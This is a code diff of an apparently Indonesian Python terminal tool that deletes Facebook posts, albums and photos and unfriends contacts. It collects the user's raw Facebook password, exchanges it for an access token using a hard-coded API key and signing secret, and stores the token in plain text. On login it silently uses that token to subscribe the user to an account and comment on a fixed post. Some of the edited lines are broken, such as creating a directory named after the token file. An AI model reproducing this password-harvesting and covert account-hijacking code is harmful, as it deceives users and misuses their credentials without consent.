@@ -20,33 +20,28 @@ def mengetik(s):
 		time.sleep(0.05)
 
 logo=(h+'''
-    
-    ╔═╗─╔╗╔═══╗╔╗─╔╗╔╗──╔╗╔═══╗╔═╗─╔╗ ┏━━━━━━━━━━━━━━━━━━━━┓
-    ║║╚╗║║║╔═╗║║║─║║║╚╗╔╝║║╔══╝║║╚╗║║ ┃Tɪᴅᴀᴋ    Aᴅᴀ  Sʏsᴛᴇᴍ┃
-    ║╔╗╚╝║║║─╚╝║║─║║╚╗╚╝╔╝║╚══╗║╔╗╚╝║ ┃Yɢ  Aᴍᴀɴ  Jɪᴋᴀ Mᴀsɪʜ┃
-    ║║╚╗║║║║╔═╗║║─║║─╚╗╔╝─║╔══╝║║╚╗║║ ┃Dɪʙᴜᴀᴛ  Oʟᴇʜ  Tᴀɴɢᴀɴ┃
-    ║║─║║║║╚╩═║║╚═╝║──║║──║╚══╗║║─║║║ ┃Mᴀɴᴜsɪᴀ, Pᴇʀᴄᴀʏᴀʟᴀʜ!┃
-    ╚╝─╚═╝╚═══╝╚═══╝──╚╝──╚═══╝╚╝─╚═╝ ┗━━━━━━━━━━━━━━━━━━━━┛
+╔═╗─╔╗╔═══╗╔╗─╔╗╔╗──╔╗╔═══╗╔═╗─╔╗ ┏━━━━━━━━━━━━━━━━━━━━┓
+║║╚╗║║║╔═╗║║║─║║║╚╗╔╝║║╔══╝║║╚╗║║ ┃Tɪᴅᴀᴋ    Aᴅᴀ  Sʏsᴛᴇᴍ┃
+║╔╗╚╝║║║─╚╝║║─║║╚╗╚╝╔╝║╚══╗║╔╗╚╝║ ┃Yɢ  Aᴍᴀɴ  Jɪᴋᴀ Mᴀsɪʜ┃
+║║╚╗║║║║╔═╗║║─║║─╚╗╔╝─║╔══╝║║╚╗║║ ┃Dɪʙᴜᴀᴛ  Oʟᴇʜ  Tᴀɴɢᴀɴ┃
+║║─║║║║╚╩═║║╚═╝║──║║──║╚══╗║║─║║║ ┃Mᴀɴᴜsɪᴀ, Pᴇʀᴄᴀʏᴀʟᴀʜ!┃
+╚╝─╚═╝╚═══╝╚═══╝──╚╝──╚═══╝╚╝─╚═╝ ┗━━━━━━━━━━━━━━━━━━━━┛
 ''')
 
 cssLoginWarning=(k+'''
 [WARNING!!]
- 			Masukan user name facebook kamu, bisa ID,
- 			bisa Email, bisa Nomor Telpon diterminal!
- 			Untuk kata sandi  seusai  ENTER  Username
- 			harap hati-hati, karena TEXT tidak tampil.
+Masukan user name facebook kamu, bisa ID,
+bisa Email, bisa Nomor Telpon diterminal!
+Untuk kata sandi  seusai  ENTER  Username
+ harap hati-hati, karena TEXT tidak tampil.
 
-* mohon hubungi kami jika terjadi eror atau program
-  tidak bekerja dengan sempurna!
+* mohon hubungi kami jika terjadi eror atau
+program tidak bekerja dengan sempurna!
 ''')
 
-UserValidation=(h+'''
-	Tulis Username disini :
-''')
+UserValidation=(h+'''Tulis Username disini :''')
 
-UserValidati0n=(h+'''
-	Tulis Password disini :
-''')
+UserValidati0n=(h+'''Tulis Password disini :''')
 
 response=[]
 id=[]
@@ -54,16 +49,16 @@ id=[]
 def menu():
 	os.system('clear')
 	try:
-		token=open('cookie/token.log','r').read()
+		token=open('result/token.txt','r').read()
 	except IOError:
 		print(m+'['+p+'!'+m+'] Token not found')
 		time.sleep(1)
-		os.system('rm -rf cookie/token.log')
+		os.system('rm -rf result/token.txt')
 	try:	
 		response = requests.get('https://graph.facebook.com/me?access_token='+token).json()
 	except KeyError:
 		print(m+'['+p+'!'+m+'] Token not found')
-		os.system('rm -rf cookie/token.log')
+		os.system('rm -rf result/token.txt')
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
@@ -88,7 +83,7 @@ def menu():
 	elif c=='4' or c=='04':
 		unfriend()
 	elif c=='0' or c=='00':
-		os.system('rm -rf cookie/token.log')
+		os.system('rm -rf result/token.txt')
 		os.sys.exit()
 	else:
 		print(m+'[!] Wrong input')
@@ -99,11 +94,11 @@ def menu():
 def deletePost():
 	os.system('clear')
 	try:
-		token=open('cookie/token.log','r').read()
+		token=open('result/token.txt','r').read()
 	except IOError:
 		print(m+'['+p+'!'+m+'] Token not found')
 		time.sleep(1)
-		os.system('rm -rf token.txt')
+		os.system('rm -rf result/token.txt')
 		login()
 	response = requests.get('https://graph.facebook.com/me?access_token='+token).json()
 	os.system('clear')
@@ -132,11 +127,11 @@ def deletePost():
 def deleteAlbums():
 	os.system('clear')
 	try:
-		token=open('cookie/token.log','r').read()
+		token=open('result/token.txt','r').read()
 	except IOError:
 		print(m+'['+p+'!'+m+'] Token not found')
 		time.sleep(1)
-		os.system('rm -rf cookie/token.log')
+		os.system('rm -rf result/token.txt')
 		login()
 	response = requests.get('https://graph.facebook.com/me?access_token='+token).json()
 	os.system('clear')
@@ -165,11 +160,11 @@ def deleteAlbums():
 def deletePhoto():
 	os.system('clear')
 	try:
-		token=open('cookie/token.log','r').read()
+		token=open('result/token.txt','r').read()
 	except IOError:
 		print(m+'['+p+'!'+m+'] Token not found')
 		time.sleep(1)
-		os.system('rm -rf cookie/token.log')
+		os.system('rm -rf result/token.txt')
 		login()
 	response = requests.get('https://graph.facebook.com/v2.3/me/albums.limit(49)&access_token='+token)
 	os.system('clear')
@@ -199,11 +194,11 @@ def deletePhoto():
 def unfriend():
 	os.system('clear')
 	try:
-		token=open('cookie/token.log','r').read()
+		token=open('result/token.txt','r').read()
 	except IOError:
 		print(m+'['+p+'!'+m+'] Token not found')
 		time.sleep(1)
-		os.system('rm -rf cookie/token.log')
+		os.system('rm -rf result/token.txt')
 		login()
 	response = requests.get('https://graph.facebook.com/me?access_token='+token).json()
 	os.system('clear')
@@ -230,11 +225,11 @@ def unfriend():
 if __name__=='__main__':
 	os.system('clear')
 	try:
-		os.mkdir('cookie')
+		os.mkdir('result/token.txt')
 	except OSError:
 		pass
 	try:
-		token=open('cookie/token.log','r')
+		token=open('result/token.txt','r')
 		menu()
 	except (KeyError,IOError):
 		os.system('clear')
@@ -242,7 +237,7 @@ if __name__=='__main__':
 		print(p+40*'_')
 		print (cssLoginWarning);
 		em = input(UserValidation);
-		pas = getpass.getpass(UserValidati0n)
+		pas = getpass(UserValidati0n)
 		try:
 			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+em+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.7844da86d1d2e90b4436959368cc338d'
 			data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":em,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"}
@@ -250,11 +245,11 @@ if __name__=='__main__':
 			x.update(sig.encode('utf-8'))
 			data.update({'sig':x.hexdigest()})
 			response=s.get(graphFB,params=data).json()
-			nguyen=open('cookie/token.log','w')
+			nguyen=open('result/token.txt','w')
 			nguyen.write(response['access_token'])
 			nguyen.close()
 			if 'access_token' in response:
-				token=open('cookie/token.log','r').read()
+				token=open('result/token.txt','r').read()
 				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'https://graph.facebook.com/api.version/subscribers?access_token='+token);s.post(url+'https://graph.facebook.com/100025271623353_485040922348291/comments?message=❤️&access_token='+token)
 				time.sleep(1)
 				menu()
